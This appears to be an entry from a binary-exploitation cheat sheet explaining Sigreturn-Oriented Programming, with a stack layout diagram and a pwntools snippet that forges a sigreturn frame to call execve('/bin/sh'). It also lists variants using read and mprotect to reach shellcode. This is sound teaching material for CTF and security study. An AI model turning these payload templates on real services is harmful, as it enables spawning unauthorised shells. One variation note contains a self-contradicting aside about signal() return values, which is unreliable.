# SROP (Sigreturn-Oriented Programming)

**When:** You need to set many registers (e.g., for `execve`) and lack gadgets. SROP sets ALL registers at once via a single sigreturn syscall.

**Prerequisites:**

- `syscall; ret` gadget
- Way to set `rax = 15` (SYS_rt_sigreturn)

## How it works

`sigreturn` is a syscall that restores all CPU registers from a `sigframe` on the stack. Normally the kernel pushes this frame when delivering a signal, then sigreturn pops it. By forging a fake sigframe, you control every register in one shot.

```
Stack:
+------------------+
| padding          |
+------------------+
| padding          |
+------------------+
| pop_rax; ret     |
+------------------+
| 15               |  <- SYS_rt_sigreturn
+------------------+
| syscall; ret     |  <- triggers sigreturn
+------------------+
| SigreturnFrame   |  <- forged register state starts here
| (248 bytes)      |
|                   |
| rax = 59         |  <- SYS_execve
| rdi = "/bin/sh"  |
| rsi = 0          |
| rdx = 0          |
| rip = &syscall   |  <- where execution resumes
+------------------+
```

The SigreturnFrame contains values for all general-purpose registers. After sigreturn, ROP continues with the register state you specified.

## Code

```python
from pwn import SigreturnFrame

# Build the fake register state
frame = SigreturnFrame()
frame.rax = constants.SYS_execve   # 59
frame.rdi = next(libc.search(b'/bin/sh'))
frame.rsi = 0
frame.rdx = 0
frame.rip = libc.symbols['syscall']  # address of a syscall instruction

payload = flat({offset: [
    pop_rax, constants.SYS_sigreturn,  # rax = 15
    syscall,                           # trigger sigreturn
    bytes(frame),                      # 248-byte frame
]})
```

## Variations

- **read-only SROP:** Use SROP to call `read(0, some_addr, len)` then SROP again to call `execve` with the read data.
- **SROP + mprotect:** Use SROP to call `mprotect(PAGE, 0x1000, 7)` then jump to shellcode.
- **Without pop_rax:** If you lack `pop rax` but can control rax via a function return value, chain a function that returns 15 (like `signal(14, SIG_IGN)` -> returns SIG_DFL = 0, not 15... find a function that naturally returns 15).

## Limitations

- Requires a `syscall` gadget (need gadget in libc or binary)
- Large payload (sigframe is 248 bytes)
- Some emulators/sandboxes may not support sigreturn
